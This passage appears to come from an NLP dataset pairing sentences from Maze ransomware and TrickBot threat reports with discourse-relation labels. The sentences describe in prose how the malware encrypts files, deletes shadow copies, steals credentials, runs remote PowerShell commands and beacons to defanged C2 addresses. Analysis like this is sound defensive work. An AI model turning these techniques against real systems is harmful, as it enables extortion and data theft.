        "relation": "NEXT"
    },
    {
        "S1": "It enters these folders but then promptly exits them using the command \u201c..\u201d, meaning it returns to the previous folder in the path.",
        "S2": "For example, in the beginning it enters the folders \u201cydw\u201d and \u201cfdygg\u201d but later returns to the root of the Windows installation unit with two \u201c..\u201d commands that lead to \u201cC:\\\u201d in this case.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, in the beginning it enters the folders \u201cydw\u201d and \u201cfdygg\u201d but later returns to the root of the Windows installation unit with two \u201c..\u201d commands that lead to \u201cC:\\\u201d in this case.",
        "S2": "It later concatenates with the \u201cWindows\u201d folder and continues with the same behavior to finally enter into \u201csystem32\u201d where it calls the \u201cwmic.exe\u201d program with the switches to delete the shadow volumes.",
        "relation": "NEXT"
    },
    {
        "S1": "It later concatenates with the \u201cWindows\u201d folder and continues with the same behavior to finally enter into \u201csystem32\u201d where it calls the \u201cwmic.exe\u201d program with the switches to delete the shadow volumes.",
        "S2": "This is done to try obfuscating this call, though such suspicious behavior may cause an antivirus program to stop it anyway, but it is proof that the malware coders have skills in programming and a good understanding of Windows behavior.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is done to try obfuscating this call, though such suspicious behavior may cause an antivirus program to stop it anyway, but it is proof that the malware coders have skills in programming and a good understanding of Windows behavior.",
        "S2": "It is important to understand that this \u201cpath\u201d used in the command with non-existent folders is random and does not need to use the same number of folders to make the obfuscation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is important to understand that this \u201cpath\u201d used in the command with non-existent folders is random and does not need to use the same number of folders to make the obfuscation.",
        "S2": "After the deletion process, the malware gets the function \u201cWow64RevertWow64FsRedirection\u201d using the function \u201cGetProcAddress\u201d and calls it in a dynamic way to leave the system in the same state as before.",
        "relation": "MISC"
    },
    {
        "S1": "After the deletion process, the malware gets the function \u201cWow64RevertWow64FsRedirection\u201d using the function \u201cGetProcAddress\u201d and calls it in a dynamic way to leave the system in the same state as before.",
        "S2": "Maze affects network resources too, using the functions \u201cWNetOpenEnumW\u201d, \u201cWNetEnumResourceW\u201d, \u201cWNetCloseEnum\u201d and \u201cWNetAddConnection2W\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "Maze affects network resources too, using the functions \u201cWNetOpenEnumW\u201d, \u201cWNetEnumResourceW\u201d, \u201cWNetCloseEnum\u201d and \u201cWNetAddConnection2W\u201d.",
        "S2": "The malware uses two algorithms to crypt the files, ChaCha which is based on the Salsa20 algorithm that is symmetric and, for protection, an RSA algorithm that is asymmetric",
        "relation": "NEXT"
    },
    {
        "S1": "The malware uses two algorithms to crypt the files, ChaCha which is based on the Salsa20 algorithm that is symmetric and, for protection, an RSA algorithm that is asymmetric",
        "S2": "In each execution the malware creates a Public BLOB of one RSA key that will be used to crypt the part that holds the information to decrypt the files, and one Private BLOB with an RSA key that allows decryption of the information crypted with the public RSA blob created previously.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In each execution the malware creates a Public BLOB of one RSA key that will be used to crypt the part that holds the information to decrypt the files, and one Private BLOB with an RSA key that allows decryption of the information crypted with the public RSA blob created previously.",
        "S2": "Just like other ransomware, this malware has an RSA Public BLOB embedded that will be imported to protect the RSA private BLOB of the victim.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Just like other ransomware, this malware has an RSA Public BLOB embedded that will be imported to protect the RSA private BLOB of the victim.",
        "S2": "Only the malware developers have the RSA private blob to decrypt their public RSA Blob.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Only the malware developers have the RSA private blob to decrypt their public RSA Blob.",
        "S2": "This key is protected with a crypto using a key of 32 bits and iv of 8 bytes using the function \u201cCryptGenRandom\u201d to avoid memory dumps but, later, it will need to be decrypted before use.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This key is protected with a crypto using a key of 32 bits and iv of 8 bytes using the function \u201cCryptGenRandom\u201d to avoid memory dumps but, later, it will need to be decrypted before use.",
        "S2": "After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime.",
        "relation": "NEXT"
    },
    {
        "S1": "After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime.",
        "S2": "After this, it creates the ransom note prepared for this infected machine in the root folder and then starts looking for folders and files to crypt.",
        "relation": "NEXT"
    },
    {
        "S1": "After this, it creates the ransom note prepared for this infected machine in the root folder and then starts looking for folders and files to crypt.",
        "S2": "An example ransom note, with some data anonymized, is shown below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "An example ransom note, with some data anonymized, is shown below:",
        "S2": "The procedure to crypt the files is easy, with the malware taking the following steps:",
        "relation": "MISC"
    },
    {
        "S1": "The procedure to crypt the files is easy, with the malware taking the following steps:",
        "S2": "- Check the existence of the file with the function \u201cSetFileAttributesW\u201d with the attribute \u201cFILE_ATTRIBUTE_ARCHIVE\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "- Check the existence of the file with the function \u201cSetFileAttributesW\u201d with the attribute \u201cFILE_ATTRIBUTE_ARCHIVE\u201d.",
        "S2": "- Reserve memory to the file with a call to \u201cVirtual Alloc\u201d for the key and iv.",
        "relation": "NEXT"
    },
    {
        "S1": "- Reserve memory to the file with a call to \u201cVirtual Alloc\u201d for the key and iv.",
        "S2": "- Open the file with read and write permissions with the function \u201cCreateFileW\u201d with the flag \u201cOPEN_EXISTING\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "- Open the file with read and write permissions with the function \u201cCreateFileW\u201d with the flag \u201cOPEN_EXISTING\u201d.",
        "S2": "- Get the file size with the function \u201cGetFileSizeEx\u201d (it is important for managing big files, \u201cGetFileSize\u201d is not good for bigger files).",
        "relation": "NEXT"
    },
    {
        "S1": "- Get the file size with the function \u201cGetFileSizeEx\u201d (it is important for managing big files, \u201cGetFileSize\u201d is not good for bigger files).",
        "S2": "- Create a file mapping with the functions \u201cCreateFileMappingW\u201d and \u201cMapViewOfFile\u201d",
        "relation": "NEXT"
    },
    {
        "S1": "- Create a file mapping with the functions \u201cCreateFileMappingW\u201d and \u201cMapViewOfFile\u201d",
        "S2": "- Generate a random key of 32 bytes with the function \u201cCryptGenRandom\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "- Generate a random key of 32 bytes with the function \u201cCryptGenRandom\u201d.",
        "S2": "- Generate a random iv of 8 bytes with the function \u201cCryptGenRandom\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "- Generate a random iv of 8 bytes with the function \u201cCryptGenRandom\u201d.",
        "S2": "- Reserve 264 bytes of memory with the function \u201cVirtualAlloc\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "- Reserve 264 bytes of memory with the function \u201cVirtualAlloc\u201d.",
        "S2": "- Generate a new random extension for the victim file.",
        "relation": "NEXT"
    },
    {
        "S1": "- Generate a new random extension for the victim file.",
        "S2": "Each file has a different extension but does not lose the original extension; the new one is appended to the old one.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Each file has a different extension but does not lose the original extension; the new one is appended to the old one.",
        "S2": "For example, \u201c1.zip\u201d becomes \u201c1.zip.gthf\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, \u201c1.zip\u201d becomes \u201c1.zip.gthf\u201d.",
        "S2": "- Crypt the file with the ChaCha algorithm and the key and iv with the RSA public key generated in runtime.",
        "relation": "MISC"
    },
    {
        "S1": "- Crypt the file with the ChaCha algorithm and the key and iv with the RSA public key generated in runtime.",
        "S2": "- Write this new block with the key and iv to decrypt at the end of the file.",
        "relation": "NEXT"
    },
    {
        "S1": "- Write this new block with the key and iv to decrypt at the end of the file.",
        "S2": "- Rename the file with the function \u201cMoveFileExW\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "- Rename the file with the function \u201cMoveFileExW\u201d.",
        "S2": "That way it is not possible to use forensic tools to recover the files because they use the same sector on the raw disk.",
        "relation": "ELABORATION"
    },
    {
        "S1": "That way it is not possible to use forensic tools to recover the files because they use the same sector on the raw disk.",
        "S2": "The malware does not delete the file using the function \u201cDeleteFileW\u201d and later create a new one with the crypted data.",
        "relation": "MISC"
    },
    {
        "S1": "The malware does not delete the file using the function \u201cDeleteFileW\u201d and later create a new one with the crypted data.",
        "S2": "Instead, all changes are applied in the mapping directly, in memory, without using a file pointer on the disk to read and write, which makes the process much quicker.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Instead, all changes are applied in the mapping directly, in memory, without using a file pointer on the disk to read and write, which makes the process much quicker.",
        "S2": "- The image of the file is unmapped, and handles closed.",
        "relation": "MISC"
    },
    {
        "S1": "- The image of the file is unmapped, and handles closed.",
        "S2": "- The process is repeated with new files.",
        "relation": "NEXT"
    },
    {
        "S1": "- The process is repeated with new files.",
        "S2": "The list of folders that the malware avoids are:",
        "relation": "MISC"
    },
    {
        "S1": "The list of folders that the malware avoids are:",
        "S2": "The malware ignores these file extensions:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware ignores these file extensions:",
        "S2": "The malware also has a list of filenames that will not be crypted:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware also has a list of filenames that will not be crypted:",
        "S2": "However, it does crypt the file \u201cntuser.ini\u201d to prevent other ransomwares from crypting it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, it does crypt the file \u201cntuser.ini\u201d to prevent other ransomwares from crypting it.",
        "S2": "It creates the ransom note in each folder that it can.",
        "relation": "NEXT"
    },
    {
        "S1": "It creates the ransom note in each folder that it can.",
        "S2": "When the malware finishes crypting all files it changes the desktop wallpaper to this image:",
        "relation": "NEXT"
    },
    {
        "S1": "When the malware finishes crypting all files it changes the desktop wallpaper to this image:",
        "S2": "The malware tries to make connections to IP addresses that have been crypted in the binary to send information about the infected machine, as seen below:",
        "relation": "NEXT"
    },
    {
        "S1": "The malware tries to make connections to IP addresses that have been crypted in the binary to send information about the infected machine, as seen below:",
        "S2": "It is important to take into consideration that the malware forges the POST string to make the connection with a random choice from a list of possible strings such as \u201cforum\u201d, \u201cphp\u201d, \u201cview\u201d, etc., to make detection harder with IPS or other filters on the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is important to take into consideration that the malware forges the POST string to make the connection with a random choice from a list of possible strings such as \u201cforum\u201d, \u201cphp\u201d, \u201cview\u201d, etc., to make detection harder with IPS or other filters on the network.",
        "S2": "The IP addresses are detected as from the Russian Federation but that does not prove that the malware came from this country; it could be deliberate misdirection but, with the language checks of CIS countries, it certainly appears possible.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The IP addresses are detected as from the Russian Federation but that does not prove that the malware came from this country; it could be deliberate misdirection but, with the language checks of CIS countries, it certainly appears possible.",
        "S2": "The use of IP addresses instead of domain names is to avoid DNS resolutions that can be altered or redirected to a loopback, for example using the \u201chost\u201d file in Windows.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The use of IP addresses instead of domain names is to avoid DNS resolutions that can be altered or redirected to a loopback, for example using the \u201chost\u201d file in Windows.",
        "S2": "This makes the trace of IPs more complicated and avoids having the connection blocked.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This makes the trace of IPs more complicated and avoids having the connection blocked.",
        "S2": "The malware uses this agent to make the connection, but it can change between samples:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware uses this agent to make the connection, but it can change between samples:",
        "S2": "From a memory dump we can extract the IPs used by these connections, as well as a curious string that talks about Lawrence Abrams, the admin of the web site \u201cbleepingcomputer\u201d who was contacted directly by the developers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "From a memory dump we can extract the IPs used by these connections, as well as a curious string that talks about Lawrence Abrams, the admin of the web site \u201cbleepingcomputer\u201d who was contacted directly by the developers.",
        "S2": "It is not known why they included this email address because it has no relation to the ransom note and is not used anywhere else.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is not known why they included this email address because it has no relation to the ransom note and is not used anywhere else.",
        "S2": "Perhaps it is a means of mocking the administrator of a site that frequently reports on ransomware?",
        "relation": "ELABORATION"
    },
    {
        "S1": "Perhaps it is a means of mocking the administrator of a site that frequently reports on ransomware?",
        "S2": "The connections to the C2C IP addresses, in a pcap using Wireshark, can be seen perfectly:",
        "relation": "MISC"
    },
    {
        "S1": "The connections to the C2C IP addresses, in a pcap using Wireshark, can be seen perfectly:",
        "S2": "Maze has some strings in memory that are interesting and something that may be worth further analysis in the future:",
        "relation": "MISC"
    },
    {
        "S1": "Maze has some strings in memory that are interesting and something that may be worth further analysis in the future:",
        "S2": "The webpage for making the payment requested in the ransom note gives a price and verifies that all is correct.",
        "relation": "MISC"
    },
    {
        "S1": "The webpage for making the payment requested in the ransom note gives a price and verifies that all is correct.",
        "S2": "Maze has a chat function to contact the operators and receive information about how to obtain the cryptocurrency required to make payment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Maze has a chat function to contact the operators and receive information about how to obtain the cryptocurrency required to make payment.",
        "S2": "Of course, as with many types of ransomware, there is an offer to decrypt three images for free and that service has been verified as working:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attack starts with a phishing email that contains a malicious link to a file hosted on Google Docs named \u201cAnnual Bonus Report.doc\u201d.",
        "S2": "When the user clicks on the link, the TrickBot dropper downloads onto the target machine.",
        "relation": "NEXT"
    },
    {
        "S1": "When the user clicks on the link, the TrickBot dropper downloads onto the target machine.",
        "S2": "This differs from previous TrickBot attacks we have seen, where TrickBot is usually dropped through a Microsoft Office document or by another malware like Emotet.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This differs from previous TrickBot attacks we have seen, where TrickBot is usually dropped through a Microsoft Office document or by another malware like Emotet.",
        "S2": "The campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document.",
        "S2": "When the user double-clicks the file, they are presented with a decoy message box.",
        "relation": "NEXT"
    },
    {
        "S1": "When the user double-clicks the file, they are presented with a decoy message box.",
        "S2": "To avoid suspicion, the decoy message suggests the user should update Microsoft Word or open the file from another computer.",
        "relation": "NEXT"
    },
    {
        "S1": "To avoid suspicion, the decoy message suggests the user should update Microsoft Word or open the file from another computer.",
        "S2": "While at first glance these files can be mistaken for legitimate Microsoft Word files, a closer inspection of the file metadata indicates they are not associated with Microsoft Word, nor are they Microsoft Word document files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While at first glance these files can be mistaken for legitimate Microsoft Word files, a closer inspection of the file metadata indicates they are not associated with Microsoft Word, nor are they Microsoft Word document files.",
        "S2": "Most of the initial payloads in these campaigns are signed with valid certificates to evade security tools.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Most of the initial payloads in these campaigns are signed with valid certificates to evade security tools.",
        "S2": "They abuse the relative trust that is given to signed binaries to avoid detection.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They abuse the relative trust that is given to signed binaries to avoid detection.",
        "S2": "The message box distracts the user as TrickBot\u2019s payload is downloaded, stored in the %TEMP% folder, and executed.",
        "relation": "MISC"
    },
    {
        "S1": "The message box distracts the user as TrickBot\u2019s payload is downloaded, stored in the %TEMP% folder, and executed.",
        "S2": "A new process injects the TrickBot payload into a svchost.exe process.",
        "relation": "NEXT"
    },
    {
        "S1": "A new process injects the TrickBot payload into a svchost.exe process.",
        "S2": "Once TrickBot\u2019s main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected endpoint and the network.",
        "relation": "NEXT"
    },
    {
        "S1": "Once TrickBot\u2019s main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected endpoint and the network.",
        "S2": "This information is crucial, as it determines the course of the attack.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This information is crucial, as it determines the course of the attack.",
        "S2": "TrickBot checks for Internet connectivity by trying to access several designated domains.",
        "relation": "MISC"
    },
    {
        "S1": "TrickBot checks for Internet connectivity by trying to access several designated domains.",
        "S2": "These domains are preconfigured and belong to legitimate web services, including: checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, ip.anysrc.net.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These domains are preconfigured and belong to legitimate web services, including: checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, ip.anysrc.net.",
        "S2": "Once TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains.",
        "relation": "MISC"
    },
    {
        "S1": "Once TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains.",
        "S2": "It collects and sends information about where the target machine is located to the C2 servers.",
        "relation": "NEXT"
    },
    {
        "S1": "It collects and sends information about where the target machine is located to the C2 servers.",
        "S2": "After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity.",
        "relation": "NEXT"
    },
    {
        "S1": "After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity.",
        "S2": "The module core-parser.dll is reflectively loaded into svchost.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "The module core-parser.dll is reflectively loaded into svchost.exe.",
        "S2": "core-parser.dll parses the TrickBot config files and extracts IP addresses for secondary C2 communication, redirection, and web injection logic.",
        "relation": "NEXT"
    },
    {
        "S1": "core-parser.dll parses the TrickBot config files and extracts IP addresses for secondary C2 communication, redirection, and web injection logic.",
        "S2": "TrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server.",
        "relation": "NEXT"
    },
    {
        "S1": "TrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server.",
        "S2": "The C2 server is responsible for handling the stolen data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The C2 server is responsible for handling the stolen data.",
        "S2": "TrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique (LOLBin).",
        "relation": "MISC"
    },
    {
        "S1": "TrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique (LOLBin).",
        "S2": "This command dumps the Extensible Storage Engine (ESE) database format.",
        "relation": "NEXT"
    },
    {
        "S1": "This command dumps the Extensible Storage Engine (ESE) database format.",
        "S2": "This variant of TrickBot employs a new, unique ability to steal passwords from KeePass, a free, open- source password manager.",
        "relation": "MISC"
    },
    {
        "S1": "This variant of TrickBot employs a new, unique ability to steal passwords from KeePass, a free, open- source password manager.",
        "S2": "TrickBot's KeePass stealing capabilities seem to be inspired (or even partially copy-pasted) from a publicly available tool dubbed PoshKPBrute, a script that performs a dictionary attack against KeePass .kdbx files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "TrickBot's KeePass stealing capabilities seem to be inspired (or even partially copy-pasted) from a publicly available tool dubbed PoshKPBrute, a script that performs a dictionary attack against KeePass .kdbx files.",
        "S2": "Once it finds the dictionary key, it dumps all passwords as an output and sends the attackers the master password.",
        "relation": "NEXT"
    },
    {
        "S1": "Once it finds the dictionary key, it dumps all passwords as an output and sends the attackers the master password.",
        "S2": "TrickBot\u2019s stealer module also tries to extract keys from Filezilla, OpenSSH and OpenVPN.",
        "relation": "MISC"
    },
    {
        "S1": "TrickBot\u2019s stealer module also tries to extract keys from Filezilla, OpenSSH and OpenVPN.",
        "S2": "In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe.",
        "relation": "LIST"
    },
    {
        "S1": "In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe.",
        "S2": "They gather information on:",
        "relation": "ELABORATION"
    },
    {
        "S1": "They gather information on:",
        "S2": "- All trusted domains, domains, and domain controllers",
        "relation": "ELABORATION"
    },
    {
        "S1": "- All trusted domains, domains, and domain controllers",
        "S2": "- A list of computers and network devices on the network",
        "relation": "LIST"
    },
    {
        "S1": "- A list of computers and network devices on the network",
        "S2": "- The infected machine user and groups the user belongs to",
        "relation": "LIST"
    },
    {
        "S1": "- The infected machine user and groups the user belongs to",
        "S2": "- The infected machine, including machine name, operating system, workstation domain, and more information",
        "relation": "LIST"
    },
    {
        "S1": "- The infected machine, including machine name, operating system, workstation domain, and more information",
        "S2": "- Network adapters that have connected to the machine and DNS servers",
        "relation": "LIST"
    },
    {
        "S1": "- Network adapters that have connected to the machine and DNS servers",
        "S2": "The attacker also uses PowerShell to test DNS entry settings.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attacker also uses PowerShell to test DNS entry settings.",
        "S2": "They use the command -q=srv_kerberos_tcp on the process nslookup.exe to open an interactive shell.",
        "relation": "NEXT"
    },
    {
        "S1": "They use the command -q=srv_kerberos_tcp on the process nslookup.exe to open an interactive shell.",
        "S2": "They use the shell to expand their search to other machines on the network by searching for things like a list of the domain controllers.",
        "relation": "NEXT"
    },
    {
        "S1": "They use the shell to expand their search to other machines on the network by searching for things like a list of the domain controllers.",
        "S2": "With this in mind, we gather that the attackers goal is to spread within organizations to multiple machines, not just to the target machine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "With this in mind, we gather that the attackers goal is to spread within organizations to multiple machines, not just to the target machine.",
        "S2": "The threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target.",
        "S2": "If so, they escalate their efforts by switching to interactive hacking: reconnaissance, credential dumping, lateral movement, and in some cases the mass deployment of ransomware across endpoints connected to the domain controller.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If so, they escalate their efforts by switching to interactive hacking: reconnaissance, credential dumping, lateral movement, and in some cases the mass deployment of ransomware across endpoints connected to the domain controller.",
        "S2": "The threat actor leverages PowerShell to send additional payloads to the target machine.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor leverages PowerShell to send additional payloads to the target machine.",
        "S2": "They issue commands to fetch a payload from a secondary server and, once it\u2019s downloaded, immediately execute it on the target machine through PowerShell.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They issue commands to fetch a payload from a secondary server and, once it\u2019s downloaded, immediately execute it on the target machine through PowerShell.",
        "S2": "The northracing[.]net URL contains a PowerShell script in the contents of the webpage.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The northracing[.]net URL contains a PowerShell script in the contents of the webpage.",
        "S2": "Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity.",
        "S2": "The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see if it should continue its operation.",
        "relation": "MISC"
    },
    {
        "S1": "The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see if it should continue its operation.",
        "S2": "If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from.",
        "S2": "Each POST request is sent along with a UUID generated from the user\u2019s hostname and the current process ID.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Each POST request is sent along with a UUID generated from the user\u2019s hostname and the current process ID.",
        "S2": "A POST request containing basic information about the machine is sent, which includes the current user and their domain, the root of the file system, and information about the operating system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A POST request containing basic information about the machine is sent, which includes the current user and their domain, the root of the file system, and information about the operating system.",
        "S2": "This information is sent to the C2 along with the `i` parameter.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This information is sent to the C2 along with the `i` parameter.",
        "S2": "When a response is received, the payload checks to see if the response matches the value cex01.",
        "relation": "NEXT"
    },
    {
        "S1": "When a response is received, the payload checks to see if the response matches the value cex01.",
        "S2": "If it does, the PowerShell script stops executing and kills the task.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If it does, the PowerShell script stops executing and kills the task.",
        "S2": "If the response is any other value, the script sets a timeout variable based on the response and continues to the main loop.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the response is any other value, the script sets a timeout variable based on the response and continues to the main loop.",
        "S2": "This indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.",
        "S2": "The main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.",
        "relation": "MISC"
    },
    {
        "S1": "The main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.",
        "S2": "Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet.",
        "relation": "NEXT"
    },
    {
        "S1": "Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet.",
        "S2": "The output of the command is sent back to the C2 server using a POST request with the \u201ca\u201d parameter.",
        "relation": "NEXT"
    },
    {
        "S1": "The output of the command is sent back to the C2 server using a POST request with the \u201ca\u201d parameter.",
        "S2": "Meterpreter & Cobalt Strike Implants",
        "relation": "MISC"
    },
    {
        "S1": "Meterpreter & Cobalt Strike Implants",
        "S2": "The attackers use a Meterpreter implant to carry out post-exploitation actions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attackers use a Meterpreter implant to carry out post-exploitation actions.",
        "S2": "The Cybereason Platform detects both the shellcode and various Meterpreter DLLs reflectively loaded to memory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Cybereason Platform detects both the shellcode and various Meterpreter DLLs reflectively loaded to memory.",
        "S2": "The detected DLLs include:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The detected DLLs include:",
        "S2": "- Metsrv.dll: For Meterpreter, where the protocol and extension systems are implemented",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Metsrv.dll: For Meterpreter, where the protocol and extension systems are implemented",
        "S2": "- Ext_server_priv.x86.dll: For privilege escalation",
        "relation": "LIST"
    },
    {
        "S1": "- Ext_server_priv.x86.dll: For privilege escalation",
        "S2": "- Ext_server_stdapi.x86.dll: A metasploit post exploitation module used for reconnaissance",
        "relation": "LIST"
    },
    {
        "S1": "- Ext_server_stdapi.x86.dll: A metasploit post exploitation module used for reconnaissance",
        "S2": "Cybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent.",
        "relation": "MISC"
    },
    {
        "S1": "Cybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent.",
        "S2": "The Meterpreter agent creates a connection to port 4444 on the external IP address 91.12.89[.]129.",
        "relation": "NEXT"
    },
    {
        "S1": "The Meterpreter agent creates a connection to port 4444 on the external IP address 91.12.89[.]129.",
        "S2": "Using Meterpreter, the attackers injected Cobalt Strike and other Metasploit payloads into the rundll32.exe process.",
        "relation": "NEXT"
    },
    {
        "S1": "Using Meterpreter, the attackers injected Cobalt Strike and other Metasploit payloads into the rundll32.exe process.",
        "S2": "The attacker uses the following metasploit modules:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attacker uses the following metasploit modules:",
        "S2": "- ext_server_extapi.x86.dll : Obtains clipboard data and manipulates and decrypts the NTDS file",
        "relation": "ELABORATION"
    },
    {
        "S1": "- ext_server_extapi.x86.dll : Obtains clipboard data and manipulates and decrypts the NTDS file",
        "S2": "- ext_server_priv.x86.dll : Performs privilege escalation",
        "relation": "LIST"
    },
    {
        "S1": "- ext_server_priv.x86.dll : Performs privilege escalation",
        "S2": "- Ext_server_stdapi.x86.dll : Performs reconnaissance activity",
        "relation": "LIST"
    },
    {
        "S1": "- Ext_server_stdapi.x86.dll : Performs reconnaissance activity",
        "S2": "- Bypassuac.x64.dll: A post-exploitation module used to bypass User Account Control",
        "relation": "LIST"
    },
    {
        "S1": "- Bypassuac.x64.dll: A post-exploitation module used to bypass User Account Control",
        "S2": "Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the FIN6 threat actor.",
        "relation": "MISC"
    },
    {
        "S1": "Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the FIN6 threat actor.",
        "S2": "The threat actor uses known Cobalt Strike modules to enumerate Active Directory information:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor uses known Cobalt Strike modules to enumerate Active Directory information:",
        "S2": "The attackers execute several Base64-encoded PowerShell commands in order to determine if the infected machine\u2019s user is in the admin or domain admin group.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attackers execute several Base64-encoded PowerShell commands in order to determine if the infected machine\u2019s user is in the admin or domain admin group.",
        "S2": "After verifying the user is an admin, the threat actor gathers information about the domain controllers and their IP addresses using an additional Base64-encoded and compressed PowerShell command.",
        "relation": "NEXT"
    },
    {
        "S1": "After verifying the user is an admin, the threat actor gathers information about the domain controllers and their IP addresses using an additional Base64-encoded and compressed PowerShell command.",
        "S2": "The decoded PowerShell command that attempts to gather domain controller information.",
        "relation": "NEXT"
    },
    {
        "S1": "The decoded PowerShell command that attempts to gather domain controller information.",
        "S2": "The attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.",
        "relation": "NEXT"
    },
    {
        "S1": "The attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.",
        "S2": "The ADfind tool has reportedly been used previously in attacks related to FIN6.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The ADfind tool has reportedly been used previously in attacks related to FIN6.",
        "S2": "One of the most interesting payloads in these attacks is the Anchor_DNS malware, which was originally discovered in October 2019 by NTT Security.",
